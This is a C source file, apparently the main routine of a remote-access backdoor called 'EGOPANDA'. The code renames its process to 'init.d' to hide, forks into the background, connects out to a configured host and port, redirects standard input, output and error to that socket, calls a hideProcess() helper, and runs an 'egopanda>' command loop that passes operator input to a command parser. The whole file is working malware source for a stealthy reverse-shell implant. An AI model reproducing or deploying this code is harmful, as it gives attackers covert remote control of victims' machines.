#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>
#include "include/functions.h"
#include "include/parsing.h"

#define hash 0x1337
#define version "EGOPANDA version 0.1"

#define ip "127.0.0.1"
#define port 8080

int main(int argc, char * argv[])
{
    // get program location for persistence, change process name to remain "hidden" 
    char *newName = "init.d"; 
    int len = strlen(argv[0]); 
    char source[len];
    strcpy(source, argv[0]);
    for(int i = 0; i < len; i++)
        argv[0][i] = 0;
    strcpy(argv[0], newName);
    
    // background our process
    int bgpid = fork();
    if (bgpid)
    {
        return 1;
    }
    // setting up sockets
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    sa.sin_port = htons(port);

    int sock;
    sock = socket(AF_INET, SOCK_STREAM, 0);

    int success = connect(sock, (struct sockaddr *)&sa, sizeof(sa));
    if (success == -1)
    {
        printf("[-] Failed to connect!\n");
        exit(1);
    }

    // redirect file descriptors
    dup2(sock, 0);  // stdin
    dup2(sock, 1);  // stdout
    dup2(sock, 2);  // stderr

    // get a different hash
    int z = hash;

    int running = 1;

    char input[1000] = {'\0'};

    printf("egopanda> ");
    fflush(stdout);

    hideProcess();

    while (running)
    {
        fgets(input, 1000, stdin);

        // remove \n from input string
        char *pointer = strchr(input, '\n');
        if (pointer) *pointer = 0;

        if (strcmp(input, "quit") == 0 || strcmp(input, "exit") == 0)
        {
            // break out of loop
            printf("Goodbye!\n");
            running = 0;
        }
        else
        {
            parseCMD(input, version, source, sock);
        }
        if (running)
        {
            printf("egopanda> ");
            fflush(stdout);
        }
    }

    return 0;
}